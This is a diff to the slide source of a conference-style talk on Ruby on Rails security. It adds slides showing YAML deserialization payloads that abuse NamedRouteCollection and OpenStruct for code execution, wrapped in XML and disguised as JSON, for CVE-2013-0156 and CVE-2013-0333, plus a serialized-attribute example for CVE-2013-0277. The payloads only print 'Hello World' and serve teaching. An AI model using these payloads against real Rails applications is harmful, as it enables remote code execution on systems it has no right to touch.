@@ -63,7 +63,7 @@ html
           li Network Transport
 
       section
-        h2 Ruby on Rails
+        h2.full-slide Ruby on Rails
 
         ul.stack.corner
           li.lowlight Your Code
@@ -77,7 +77,7 @@ html
         h2 YAML
 
         pre
-          code.language-javascript.
+          code.language-yaml.
             ---
             name: "Tim Perry"
             company: "Softwire"
@@ -89,7 +89,7 @@ html
         h2 YAML
 
         pre
-          code.language-javascript.
+          code.language-yaml.
             --- !ruby/hash:User
             name: "Tim Perry"
             company: "Softwire"
@@ -100,7 +100,7 @@ html
       section
         h2 YAML
         pre
-          code.language-javascript.
+          code.language-ruby.
             user = User.allocate
             values.each_pair { |key,val|
                 user[key] = val
@@ -108,23 +108,65 @@ html
       section
         h2 NamedRouteCollection
         pre
-          code.language-javascript.
+          code.language-ruby.
             alias []= add
 
             def add(name, route)
               ...
-              @module.module_eval("remove_possible_method :\#{name}; ...")
+              @module.module_eval(
+                "remove_possible_method :\#{name}; ..."
+              )
               ...
             end
       section
         h2 Arbitrary Code Execution with YAML
         pre
-          code.language-javascript.
-            --- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
-            “ignored; puts 'Hello World';”: 
-                !ruby/object:OpenStruct { ‘table’:{‘defaults’:{}} }
+          code.language-yaml.
+            --- !ruby/hash:NamedRouteCollection
+            "ignored; puts 'Hello World'; \n__END__\n": 
+                !ruby/object:OpenStruct 
+                  ‘table’: {‘defaults’: {}}
+        p (Namespaces omitted)
       section
-        h2 Uh oh
+        h2 Rails
+        h4 CVE-2013-0156
+        pre
+          code.language-yaml.
+            &lt;?xml version="1.0"?&gt;
+            &lt;foo type='yaml'&gt;
+              --- !ruby/hash:NamedRouteCollection
+              "ignored; puts 'Hello World'; \n__END__\n":
+                  !ruby/object:OpenStruct
+                    'table': {'defaults': {}}
+            &lt;/foo&gt;
+      section
+        h2 Rails
+        h4 CVE-2013-0333
+        pre
+          code.language-yaml.
+            Content-Type: application/json
+
+            --- !ruby/hash\u003aNamedRouteCollection
+            "ignored; puts 'Hello World'; \n__END__\n":
+                !ruby/object\u003aOpenStruct
+                  'table': {'defaults': {}}
+      section
+        h2 Rails
+        h4 CVE-2013-0277
+        pre
+          code.language-ruby.
+            class BlogPost &lt; ActiveRecord::Base
+              :serialize tags
+            end
+    
+      section
+        h2.full-slide Ouch
+      
+      section
+        h2.full-slide Fear User Input
+
+      section
+        h2.full-slide Fear Complexity
 
 
     // build:js scripts/scripts.js
@@ -135,5 +177,7 @@ html
     script(src='bower_components/bespoke-hash/dist/bespoke-hash.min.js')
     script(src='bower_components/bespoke-state/dist/bespoke-state.min.js')
     script(src='bower_components/prism/prism.js')
+    script(src='bower_components/prism/components/prism-ruby.js')
+    script(src='scripts/prism-yaml.js')
     script(src='scripts/main.js')
     // endbuild
